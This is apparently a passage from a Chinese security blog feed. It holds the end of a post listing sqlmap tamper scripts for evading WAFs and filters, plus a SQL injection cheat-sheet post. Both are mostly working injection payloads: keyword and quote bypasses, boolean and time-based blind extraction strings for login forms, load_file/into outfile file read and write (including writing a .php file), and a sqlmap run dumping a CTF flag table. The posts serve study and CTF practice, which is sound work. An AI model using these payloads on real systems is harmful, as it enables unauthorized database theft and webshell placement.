<p>在以下版本做过测试:</p>
<p>All</p>
<p><strong>12:sp_password.py</strong></p>
<p>作用：追加<code>sp_password’</code>从DBMS日志的自动模糊处理的有效载荷的末尾</p>
<p>示例：</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">&#x27;1 AND <span class="number">9227</span>=<span class="number">9227</span>-- &#x27;</span><br><span class="line">&#x27;1 AND <span class="number">9227</span>=<span class="number">9227</span>-- sp_password&#x27;</span><br></pre></td></tr></table></figure>
<p>版本要求: <code>* MSSQL</code></p>
<h1 id="针对过滤引号的："><a href="#针对过滤引号的：" class="headerlink" title="针对过滤引号的："></a>针对过滤引号的：</h1><p><strong>1:apostrophemask.py</strong></p>
<p>作用：用<code>utf8</code>代替单引号</p>
<p>示例：</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;1 AND &#x27;1&#x27;=&#x27;1&quot;</span></span><br><span class="line">&#x27;<span class="number">1</span> AND <span class="variable">%EF</span><span class="variable">%BC</span><span class="variable">%871</span><span class="variable">%EF</span><span class="variable">%BC</span><span class="variable">%87</span><span class="operator">=</span><span class="variable">%EF</span><span class="variable">%BC</span><span class="variable">%871</span>&#x27;</span><br></pre></td></tr></table></figure>
<p>在以下版本做过测试:</p>
<p>all</p>
<p><strong>2:apostrophenullencode.py</strong></p>
<p>作用：绕过过滤双引号，替换字符和双引号。</p>
<p>示例：</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;1 AND &#x27;1&#x27;=&#x27;1&quot;</span></span><br><span class="line">&#x27;<span class="number">1</span> AND <span class="variable">%00</span><span class="variable">%271</span><span class="variable">%00</span><span class="variable">%27</span><span class="operator">=</span><span class="variable">%00</span><span class="variable">%271</span>&#x27;</span><br></pre></td></tr></table></figure>
<p>在以下版本做过测试:</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">MySQL</span> <span class="number">4</span>, <span class="number">5</span>.<span class="number">0</span> and <span class="number">5</span>.<span class="number">5</span></span><br><span class="line"><span class="attribute">Oracle</span> <span class="number">10</span>g</span><br><span class="line"><span class="attribute">PostgreSQL</span> <span class="number">8</span>.<span class="number">3</span>, <span class="number">8</span>.<span class="number">4</span>, <span class="number">9</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure>
<h1 id="针对过滤关键字的："><a href="#针对过滤关键字的：" class="headerlink" title="针对过滤关键字的："></a>针对过滤关键字的：</h1><p><strong>1:halfversionedmorekeywords.py</strong></p>
<p>作用：当数据库为<code>mysql</code>时绕过防火墙，每个关键字之前添加<code>mysql</code>版本评论</p>
<p>示例：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">(&quot;value&#x27; UNION ALL <span class="keyword">SELECT</span> CONCAT(CHAR(<span class="number">58</span>,<span class="number">107</span>,<span class="number">112</span>,<span class="number">113</span>,<span class="number">58</span>),<span class="built_in">IFNULL</span>(<span class="keyword">CAST</span>(CURRENT_USER() <span class="keyword">AS</span> CHAR),CHAR(<span class="number">32</span>)),CHAR(<span class="number">58</span>,<span class="number">97</span>,<span class="number">110</span>,<span class="number">121</span>,<span class="number">58</span>)), <span class="literal">NULL</span>, <span class="literal">NULL</span># <span class="keyword">AND</span> <span class="string">&#x27;QDWa&#x27;</span>=<span class="string">&#x27;QDWa&quot;) &quot;value&#x27;</span><span class="comment">/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND &#x27;QDWa&#x27;=&#x27;QDWa&quot;</span></span><br></pre></td></tr></table></figure>
<p>版本要求:</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">MySQL &lt; 5.1</span><br><span class="line"><span class="section">在以下版本做过测试:</span></span><br><span class="line">MySQL 4.0.18, 5.0.22</span><br></pre></td></tr></table></figure>
<p><strong>2:ifnull2ifisnull.py</strong></p>
<p>作用：绕过对<code>IFNULL</code>过滤。 替换类似<code>’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’</code></p>
<p>示例：</p>
<figure class="highlight scheme"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&#x27;IFNULL</span>(<span class="name">1</span>, <span class="number">2</span>)&#x27;</span><br><span class="line"><span class="symbol">&#x27;IF</span>(<span class="name">ISNULL</span>(<span class="name">1</span>),<span class="number">2</span>,<span class="number">1</span>)&#x27;</span><br></pre></td></tr></table></figure>
<p>版本要求:</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">MySQL</span></span><br><span class="line"><span class="selector-tag">SQLite</span> (possibly)</span><br><span class="line"><span class="selector-tag">SAP</span> <span class="selector-tag">MaxDB</span> (possibly)</span><br><span class="line">在以下版本做过测试:</span><br><span class="line"><span class="selector-tag">MySQL</span> <span class="selector-tag">5</span><span class="selector-class">.0</span> <span class="selector-tag">and</span> <span class="selector-tag">5</span><span class="selector-class">.5</span></span><br></pre></td></tr></table></figure>
<p><strong>3:multiplespaces.py</strong></p>
<p>作用：围绕SQL关键字添加多个空格</p>
<p>示例：</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">&#x27;<span class="number">1</span> <span class="built_in">UNION</span> <span class="built_in">SELECT</span> foobar&#x27;</span><br><span class="line">&#x27;<span class="number">1</span> <span class="built_in">UNION</span> <span class="built_in">SELECT</span> foobar&#x27;</span><br></pre></td></tr></table></figure>
<p>在以下版本做过测试:</p>
<p>All</p>
<p><strong>4:halfversionedmorekeywords.py</strong></p>
<p>作用：关键字前加注释</p>
<p>示例：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">value</span>’ UNION <span class="literal">ALL</span> SELECT CONCAT(CHAR(<span class="number">58</span>,<span class="number">107</span>,<span class="number">112</span>,<span class="number">113</span>,<span class="number">58</span>),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(<span class="number">32</span>)),CHAR(<span class="number">58</span>,<span class="number">97</span>,<span class="number">110</span>,<span class="number">121</span>,<span class="number">58</span>)), NULL, NULL# AND ‘QDWa’=&#x27;QDWa </span><br><span class="line"><span class="attribute">value</span>’/*!<span class="number">0</span>UNION/*!<span class="number">0</span><span class="literal">ALL</span>/*!<span class="number">0</span>SELECT/*!<span class="number">0</span>CONCAT(/*!<span class="number">0</span>CHAR(<span class="number">58</span>,<span class="number">107</span>,<span class="number">112</span>,<span class="number">113</span>,<span class="number">58</span>),/*!<span class="number">0</span>IFNULL(CAST(/*!<span class="number">0</span>CURRENT_USER()/*!<span class="number">0</span>AS/*!<span class="number">0</span>CHAR),/*!<span class="number">0</span>CHAR(<span class="number">32</span>)),/*!<span class="number">0</span>CHAR(<span class="number">58</span>,<span class="number">97</span>,<span class="number">110</span>,<span class="number">121</span>,<span class="number">58</span>)), NULL, NULL#/*!<span class="number">0</span>AND ‘QDWa’=&#x27;QDWa</span><br></pre></td></tr></table></figure>
<p>版本要求:</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">MySQL &lt; 5.1</span><br><span class="line"><span class="section">在以下版本做过测试:</span></span><br><span class="line">MySQL 4.0.18, 5.0.22</span><br></pre></td></tr></table></figure>
<p><strong>5:unionalltounion.py</strong></p>
<p>作用：替换UNION ALL SELECT UNION SELECT</p>
<p>示例：</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">&#x27;<span class="number">-1</span> <span class="built_in">UNION</span> ALL <span class="built_in">SELECT</span>&#x27;</span><br><span class="line">&#x27;<span class="number">-1</span> <span class="built_in">UNION</span> <span class="built_in">SELECT</span>&#x27;</span><br></pre></td></tr></table></figure>
<p>版本要求: all</p>
<p><strong>6:randomcomments.py</strong></p>
<p>作用：用/**/分割sql关键字</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">‘INSERT’</span><br><span class="line">‘IN<span class="regexp">//</span>S<span class="regexp">//</span>ERT’</span><br></pre></td></tr></table></figure>
<p><strong>7:unmagicquotes.py</strong></p>
<p>作用：宽字符绕过 GPC addslashes</p>
<p>示例：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>’ AND <span class="number">1</span>=<span class="number">1</span> </span><br><span class="line"> <span class="attribute">1</span>%bf%<span class="number">27</span> AND <span class="number">1</span>=<span class="number">1</span>–%<span class="number">20</span></span><br><span class="line"><span class="attribute">8</span>:randomcase.py</span><br></pre></td></tr></table></figure>
<p>作用：随机大小写</p>
<p>示例：<br>INSERT<br>InsERt<br>在以下版本做过测试:</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Microsoft</span> SQL Server <span class="number">2005</span></span><br><span class="line"><span class="attribute">MySQL</span> <span class="number">4</span>, <span class="number">5</span>.<span class="number">0</span> and <span class="number">5</span>.<span class="number">5</span></span><br><span class="line"><span class="attribute">Oracle</span> <span class="number">10</span>g</span><br><span class="line"><span class="attribute">PostgreSQL</span> <span class="number">8</span>.<span class="number">3</span>, <span class="number">8</span>.<span class="number">4</span>, <span class="number">9</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure>
<h1 id="针对过滤比较符号的："><a href="#针对过滤比较符号的：" class="headerlink" title="针对过滤比较符号的："></a>针对过滤比较符号的：</h1><p><strong>1:equaltolike.py</strong></p>
<p>作用：like 代替等号</p>
<p>示例：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id=<span class="number">1</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="keyword">LIKE</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><strong>2:greatest.py</strong></p>
<p>作用：绕过过滤’&gt;’ ,用GREATEST替换大于号。</p>
<p>示例：</p>
<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line"><span class="comment">&#x27;1 AND A &gt; B&#x27;</span></span><br><span class="line"><span class="comment">&#x27;1 AND GREATEST(A,B+1)=A&#x27;</span></span><br></pre></td></tr></table></figure>
<p>在以下版本做过测试:</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">MySQL</span> <span class="number">4</span>, <span class="number">5</span>.<span class="number">0</span> and <span class="number">5</span>.<span class="number">5</span></span><br><span class="line"><span class="attribute">Oracle</span> <span class="number">10</span>g</span><br><span class="line"><span class="attribute">PostgreSQL</span> <span class="number">8</span>.<span class="number">3</span>, <span class="number">8</span>.<span class="number">4</span>, <span class="number">9</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure>
<p><strong>3:between.py</strong></p>
<p>作用：用between替换大于号（&gt;）</p>
<p>示例：</p>
<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line"><span class="comment">&#x27;1 AND A &gt; B--&#x27;</span></span><br><span class="line"><span class="comment">&#x27;1 AND A NOT BETWEEN 0 AND B--&#x27;</span></span><br></pre></td></tr></table></figure>
<p>在以下版本做过测试:</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Microsoft</span> SQL Server <span class="number">2005</span> MySQL <span class="number">4</span>, <span class="number">5</span>.<span class="number">0</span> and <span class="number">5</span>.<span class="number">5</span></span><br><span class="line"><span class="attribute">Oracle</span> <span class="number">10</span>g</span><br><span class="line"><span class="attribute">PostgreSQL</span> <span class="number">8</span>.<span class="number">3</span>, <span class="number">8</span>.<span class="number">4</span>, <span class="number">9</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure>
<h1 id="其他类型："><a href="#其他类型：" class="headerlink" title="其他类型："></a>其他类型：</h1><p><strong>1:versionedmorekeywords.py</strong></p>
<p>作用：注释绕过</p>
<p>示例：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span> UNION <span class="literal">ALL</span> SELECT NULL, NULL, CONCAT(CHAR(<span class="number">58</span>,<span class="number">122</span>,<span class="number">114</span>,<span class="number">115</span>,<span class="number">58</span>),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(<span class="number">32</span>)),CHAR(<span class="number">58</span>,<span class="number">115</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">58</span>))# </span><br><span class="line"><span class="attribute">1</span>/*!UNION**!<span class="literal">ALL</span>**!SELECT**!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(<span class="number">58</span>,<span class="number">122</span>,<span class="number">114</span>,<span class="number">115</span>,<span class="number">58</span>),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS**!CHAR*/),/*!CHAR*/(<span class="number">32</span>)),/*!CHAR*/(<span class="number">58</span>,<span class="number">115</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">58</span>))#</span><br></pre></td></tr></table></figure>
<p>版本要求:</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">MySQL</span> &gt;= <span class="number">5</span>.<span class="number">1</span>.<span class="number">13</span></span><br></pre></td></tr></table></figure>
<p><strong>2:securesphere.py</strong></p>
<p>作用：追加特制的字符串</p>
<p>示例：</p>
<figure class="highlight csp"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;1 AND 1=1&#x27;</span></span><br><span class="line">&quot;1 AND 1=1 and <span class="string">&#x27;0having&#x27;</span>=<span class="string">&#x27;0having&#x27;</span>&quot;</span><br></pre></td></tr></table></figure>
<p>在以下版本做过测试:</p>
<p>All</p>
<p><strong>3:charunicodeencode.py</strong></p>
<p>作用：字符串 unicode 编码</p>
<p>示例：</p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line"><span class="meta">SELECT</span> FIELD%20FROM <span class="meta">TABLE</span></span><br><span class="line"><span class="name">%u0053</span><span class="name">%u0045</span><span class="name">%u004c</span><span class="name">%u0045</span><span class="name">%u0043</span><span class="name">%u0054</span><span class="name">%u0020</span><span class="name">%u0046</span><span class="name">%u0049</span><span class="name">%u0045</span><span class="name">%u004c</span><span class="name">%u0044</span><span class="name">%u0020</span><span class="name">%u0046</span><span class="name">%u0052</span><span class="name">%u004f</span><span class="name">%u004d</span><span class="name">%u0020</span><span class="name">%u0054</span><span class="name">%u0041</span><span class="name">%u0042</span><span class="name">%u004c</span><span class="name">%u0045</span>′</span><br></pre></td></tr></table></figure>
<p>版本要求:</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">ASP</span><br><span class="line">ASP.NET</span><br><span class="line">在以下版本做过测试:</span><br><span class="line">Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span> <span class="number">2000</span></span><br><span class="line">Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span> <span class="number">2005</span></span><br><span class="line">MySQL <span class="number">5.1</span><span class="number">.56</span></span><br><span class="line">PostgreSQL <span class="number">9.0</span><span class="number">.3</span></span><br></pre></td></tr></table></figure>
<p><strong>4:charencode.py</strong></p>
<p>作用：url编码</p>
<p>示例：</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">SELECT FIELD FROM<span class="variable">%20</span>TABLE</span><br><span class="line"><span class="variable">%53</span><span class="variable">%45</span><span class="variable">%4</span><span class="keyword">c</span><span class="variable">%45</span><span class="variable">%43</span><span class="variable">%54</span><span class="variable">%20</span><span class="variable">%46</span><span class="variable">%49</span><span class="variable">%45</span><span class="variable">%4</span><span class="keyword">c</span><span class="variable">%44</span><span class="variable">%20</span><span class="variable">%46</span><span class="variable">%52</span><span class="variable">%4</span>f<span class="variable">%4</span>d<span class="variable">%20</span><span class="variable">%54</span><span class="variable">%41</span><span class="variable">%42</span><span class="variable">%4</span><span class="keyword">c</span><span class="variable">%45</span></span><br></pre></td></tr></table></figure>
<p>在以下版本做过测试:</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Microsoft</span> SQL Server <span class="number">2005</span></span><br><span class="line"><span class="attribute">MySQL</span> <span class="number">4</span>, <span class="number">5</span>.<span class="number">0</span> and <span class="number">5</span>.<span class="number">5</span></span><br><span class="line"><span class="attribute">Oracle</span> <span class="number">10</span>g</span><br><span class="line"><span class="attribute">PostgreSQL</span> <span class="number">8</span>.<span class="number">3</span>, <span class="number">8</span>.<span class="number">4</span>, <span class="number">9</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure>
<p><strong>5:appendnullbyte.py</strong></p>
<p>作用：在有效负荷结束位置加载零字节字符编码</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">‘1 <span class="keyword">AND</span> <span class="attribute">1</span>=1’</span><br><span class="line">‘1 <span class="keyword">AND</span> <span class="attribute">1</span>=1%00’</span><br></pre></td></tr></table></figure>
<p>版本要求:</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">Microsoft <span class="keyword">Access</span></span><br></pre></td></tr></table></figure>
<p><strong>6:chardoubleencode.py</strong></p>
<p>作用: 双url编码(不处理以编码的)</p>
<p>示例：</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">SELECT FIELD FROM<span class="variable">%20</span>TABLE </span><br><span class="line"><span class="variable">%2553</span><span class="variable">%2545</span><span class="variable">%254</span><span class="keyword">c</span><span class="variable">%2545</span><span class="variable">%2543</span><span class="variable">%2554</span><span class="variable">%2520</span><span class="variable">%2546</span><span class="variable">%2549</span><span class="variable">%2545</span><span class="variable">%254</span><span class="keyword">c</span><span class="variable">%2544</span><span class="variable">%2520</span><span class="variable">%2546</span><span class="variable">%2552</span><span class="variable">%254</span>f<span class="variable">%254</span>d<span class="variable">%2520</span><span class="variable">%2554</span><span class="variable">%2541</span><span class="variable">%2542</span><span class="variable">%254</span><span class="keyword">c</span><span class="variable">%2545</span></span><br></pre></td></tr></table></figure>
<p><strong>7:base64encode.py</strong></p>
<p>作用：用<code>base64</code>编码替换</p>
<p>示例：</p>
<figure class="highlight scheme"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;1&#x27; AND SLEEP(5)#&quot;</span></span><br><span class="line"><span class="symbol">&#x27;MScgQU5EIFNMRUVQKDUpIw==</span>&#x27;</span><br></pre></td></tr></table></figure>
<p>版本要求:</p>
<p>all</p>
<p><strong>8:nonrecursivereplacement.py</strong></p>
<p>作用：双重查询语句。取代predefined SQL关键字with表示 suitable for替代（例如 .replace（“SELECT”、””)） filters</p>
<p>示例：</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">&#x27;<span class="number">1</span> UNION <span class="keyword">SELECT</span> <span class="number">2</span><span class="comment">--&#x27;</span></span><br><span class="line">&#x27;<span class="number">1</span> UNIOUNIONN SELESELECTCT <span class="number">2</span><span class="comment">--&#x27;</span></span><br></pre></td></tr></table></figure>
<p>在以下版本做过测试:</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line"><span class="keyword">all</span></span><br></pre></td></tr></table></figure>
<p>后续内容将会继续更新。。。。。。。。。</p>
<p>参考资料：</p>
<p>安全牛课堂-kali-linux-web篇</p>
<p>sqlmap用户手册中文版：<a href="https://octobug.gitbooks.io/sqlmap-wiki-zhcn/content/Users-manual/Introduction.html">https://octobug.gitbooks.io/sqlmap-wiki-zhcn/content/Users-manual/Introduction.html</a></p>
<p>sqlmap用户手册：<a href="http://drops.xmd5.com/static/drops/tips-143.html">http://drops.xmd5.com/static/drops/tips-143.html</a></p>
<p>例子：</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">$ sqlmap -u <span class="string">&quot;https://[REDACTED]/server.php&quot;</span> <span class="params">--header</span> <span class="string">&quot;Status: *&quot;</span> <span class="params">--prefix</span> <span class="string">&quot;3&#x27;&quot;</span> <span class="params">--suffix</span> <span class="string">&quot;#&quot;</span> <span class="params">--tamper</span> <span class="string">&quot;randomcase,space2comment&quot;</span> -A <span class="string">&quot;&quot;</span> <span class="params">--dbms</span> mysql <span class="params">--string</span> <span class="string">&quot;HTTP 401 Unauthorized&quot;</span> <span class="params">--technique=B</span> <span class="params">--sql-shell</span> <span class="params">--threads=8</span></span><br><span class="line"><span class="comment"># ...[OMITTED]...</span></span><br><span class="line">[69<span class="function">:69</span><span class="function">:69</span>] [INFO] <span class="params">(custom)</span> HEADER parameter &#x27;Status <span class="comment">#1*&#x27; appears to be &#x27;AND boolean-based blind - WHERE or HAVING clause&#x27; injectable </span></span><br><span class="line">[69<span class="function">:69</span><span class="function">:69</span>] [INFO] checking <span class="keyword">if</span> the injection point on <span class="params">(custom)</span> HEADER parameter &#x27;Status <span class="comment">#1*&#x27; is a false positive</span></span><br><span class="line"><span class="params">(custom)</span> HEADER parameter &#x27;Status <span class="comment">#1*&#x27; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N</span></span><br><span class="line">sqlmap identified the following injection point<span class="params">(s)</span> with a total of 10 HTTP<span class="params">(s)</span> requests:</span><br><span class="line"><span class="params">---</span></span><br><span class="line">Parameter: Status <span class="comment">#1* ((custom) HEADER)</span></span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: 3&#x27; AND 114514=114514<span class="comment">#</span></span><br><span class="line"><span class="params">---</span></span><br><span class="line"><span class="comment"># ...[OMITTED]...</span></span><br><span class="line">sql-shell&gt; SELECT table_name FROM information_schema.tables WHERE table_schema=database<span class="params">()</span></span><br><span class="line"><span class="comment"># ...[OMITTED]...</span></span><br><span class="line">[*] f1111111144444444444g</span><br><span class="line">[*] status</span><br><span class="line"></span><br><span class="line">sql-shell&gt; SELECT column_name FROM information_schema.columns WHERE table_name=&#x27;f1111111144444444444g&#x27;</span><br><span class="line"><span class="comment"># ...[OMITTED]...</span></span><br><span class="line">[*] ffffff14gggggg</span><br><span class="line"></span><br><span class="line">sql-shell&gt; SELECT ffffff14gggggg FROM f1111111144444444444g</span><br><span class="line"><span class="comment"># ...[OMITTED]...</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>share</category>
      </categories>
  </entry>
  <entry>
    <title>sql注入基础知识及骚操作总结</title>
    <url>/2020/04/30/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%8F%8A%E9%AA%9A%E6%93%8D%E4%BD%9C%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>sql注入基础知识及骚操作总结<a id="more"></a></p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>获取字段数： order by x 取临界值</p>
<p>获取数据库表面： database()</p>
<p>获取数据库版本： version()</p>
<p>Information_schema:mysql5.0及以上版本自带数据库，它记录有当前mysql下所有数据库名，表名，列名信息</p>
<p>Information-schema.tables:记录表名信息的表</p>
<p>Information-schema.columns:记录列名信息的表</p>
<p>Table_schema  数据库名</p>
<p>Table_name   表名</p>
<p>Column_schema   列名</p>
<p>数据库中<code>.</code>代表下一级的意思</p>
<p>常见闭合方式: <code> &#39;    &#39;）   &#39;))     &quot;    &quot;)    &quot;))</code></p>
<hr>
<p>数据库用户：user()</p>
<p>操作系统：@@version_compile_os</p>
<p>Mysqi注入文件操作</p>
<p>Load_file() 读取函数</p>
<p>Into outfile 写入函数</p>
<p>关于网站路径的获取：</p>
<ol>
<li>报错显示</li>
<li>谷歌黑客</li>
<li>读取配置文件</li>
<li>漏洞报错</li>
<li>遗留文件</li>
<li>字典猜解</li>
</ol>
<p>注意问题：路径符号及编码</p>
<hr>
<p>Mysql注入问题</p>
<p>魔术引号 magic_quotes_gpc 开关</p>
<p>安全函数   addslashes</p>
<p>编码绕过或宽字节注入</p>
<hr>
<p>Mysql高权限跨库注入</p>
<p>跨库注入条件  root权限</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">网站<span class="selector-tag">A</span>无注入点，网站<span class="selector-tag">B</span>存在masql注入，网站<span class="selector-tag">A</span>及网站<span class="selector-tag">B</span>数据库存在统一mysql数据库中，这是我们可以利用网站<span class="selector-tag">B</span>的注入点进去跨库注入获取网站<span class="selector-tag">A</span>的数据</span><br></pre></td></tr></table></figure>
<p>获取所有数据库名</p>
<p>union select schema_name,2,3,4 from information_schema.schemata</p>
<p>获取指定数据库下的表名信息</p>
<p>获取指定表名下的列名</p>
<p>获取指定数据</p>
<hr>
<p>提交方式注入</p>
<p>POST登入框注入</p>
<hr>
<h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><p><code>group_concat()</code>:全部输出</p>
<p><code>concat_ws(  ,   ,   )</code>一次性指定分隔符</p>
<p><code>left()函数</code>：  left(a,b)从左侧截取a的前b位，正确返回1，错误返回0</p>
<p><code>regexp函数</code>：  regexp ‘r’    匹配r，匹配成功返回1，反之为0</p>
<p>用法：and 1=(select 1 from information_schema.columns where table_name=’users’ and column_name regexp ‘^u’ limit 0,1)–+</p>
<p><code>like函数</code>：与regexp相识， like ‘r%’     要加百分号</p>
<p><code>substr(a,b,c)函数</code>：   从b位置开始，截取a字符串c位长度</p>
<p><code>ascii()函数</code>：     将某个字符串转化为ascii</p>
<hr>
<h3 id="布尔盲注-没有确切返回值"><a href="#布尔盲注-没有确切返回值" class="headerlink" title="布尔盲注(没有确切返回值)"></a>布尔盲注(没有确切返回值)</h3><p>1.burpsuite 爆破      and left((select database()),1)=’s’–+</p>
<p>2.ascii(substr(schema_database(),1,1))&gt;111–+  (错误)</p>
<p>3.ascii(substr(select schema_name from information_schema.schemata limit<code>1</code>,1),1,<code>1</code>))&gt;11</p>
<hr>
<p><code>load_file(&#39; &#39;)</code> 读取本地文件</p>
<p><code>Into outfile  </code>写文件       </p>
<p>用法：    select ‘mysql’ into outfile ‘test.txt’;<br>文件位置:D:\phpstudy_pro\Extensions\MySQL5.7.26\data 或者是<br>select ‘mysql’ into outfile ‘D:\phpstudy_pro\Extensions\MySQL5.7.26\test.php ‘;</p>
<hr>
<h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3><p> <code>IF(condition,A,B)</code>如果条件condition为true，则执行命令A，否则执行B</p>
<p>and<code> sleep(5)</code>–+  使用延迟的方法判断是否存在注入漏洞</p>
<p>and  if(length(database())=8,1,sleep(5))–+   判断数据库长度</p>
<p>if(ascii(substr((select database()),1,1))&gt;110,1,sleep(5))–+     判断数据库名</p>
<hr>
<h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><p>burpsuite</p>
<p>注释符<code>#</code></p>
<p><code>--+</code>仅在url中get传参是用</p>
<p>判断数据库长度：</p>
<blockquote>
<p>uname=ain’ or if(length(database()),1,sleep(5))#&amp;passwd=admin&amp;submit=Submit<br>uname=ain’ or length(database())=8#&amp;passwd=admin&amp;submit=Submit</p>
</blockquote>
<p>判断数据库名字： </p>
<blockquote>
<p>uname=ain’ or left((select schema_name from information_schema.schemata limit 4,1),1)=’s’#&amp;passwd=admin&amp;submit=Submit</p>
</blockquote>
<blockquote>
<p>uname=ain’ or ascii(substr((database()),1,1))=’115’#&amp;passwd=admin&amp;submit=Submit</p>
</blockquote>
<p>判断表名</p>
<blockquote>
<p>uname=ain’ or left((select table_name from information_schema.tables where schema_name=”security”  limit 0,1),1)=’u’#&amp;passwd=admin&amp;submit=Submit</p>
</blockquote>
<blockquote>
<p>uname=ain’ or ascii(substr((select table_name from information_schema.tables where table_schema=”security” limit 0,1),1,1))= ‘101’#&amp;passwd=admin&amp;submit=Submit</p>
</blockquote>
<p>判断列名</p>
<blockquote>
<p>uname=ain’ or left((select column_name from information_schema.columns where table_name=”users”  limit 0,1),1)=’a’#&amp;passwd=admin&amp;submit=Submit</p>
</blockquote>
<p>判断字段内容：</p>
<blockquote>
<p>uname=ain’ or ascii(substr((select username from users limit 0,1),1,1))= ‘68’#&amp;passwd=admin&amp;submit=Submit</p>
</blockquote>
<blockquote>
<p>uname=ain’ or left((select username from security.users limit 0,1),1)= ‘a’#&amp;passwd=admin&amp;submit=Submit</p>
</blockquote>
<hr>
<h1 id="常见的过滤替代函数"><a href="#常见的过滤替代函数" class="headerlink" title="常见的过滤替代函数"></a>常见的过滤替代函数</h1><table>
<thead>
<tr>
<th align="center">关键字</th>
<th align="center">可用来代替的关键字</th>
</tr>
</thead>
<tbody><tr>
<td align="center">空格</td>
<td align="center">（）, + ,科学计数法</td>
</tr>
<tr>
<td align="center">‘  单引号</td>
<td align="center">16进制,char(),%2527</td>
</tr>
<tr>
<td align="center">=和like</td>
<td align="center">regexp</td>
</tr>
<tr>
<td align="center">substr(database(),1,1)</td>
<td align="center">substr(database() from 1 for 1 )</td>
</tr>
<tr>
<td align="center">if</td>
<td align="center">case when</td>
</tr>
<tr>
<td align="center">ascii</td>
<td align="center">ord</td>
</tr>
<tr>
<td align="center">information_schema</td>
<td align="center">schema_auto_increment_columns，该视图的作   用简单来说就是用来对表自增ID的监控。</td>
</tr>
<tr>
<td align="center">order by</td>
<td align="center">group by</td>
</tr>
<tr>
<td align="center">逗号</td>
<td align="center">join</td>
</tr>
</tbody></table>
<h1 id="举一个例子"><a href="#举一个例子" class="headerlink" title="举一个例子"></a>举一个例子</h1><p>id=1^if(ascii(substr(database(),1,1))=102,2,3)</p>
<p>在改例中 ‘ , 空格 等号 like ascii被过滤,</p>
<p>第一步：用case when 替代 if</p>
<blockquote>
<p>id=1^case ascii(substr(database(),1,1)) when 102 then 2 else 3 end</p>
</blockquote>
<p>第二步：用（）替换空格</p>
<blockquote>
<p>id=1^case(ascii(substr(database(),1,1)))when(102)then(2)else(3)end</p>
</blockquote>
<p>第三步：用ord替换ascii</p>
<blockquote>
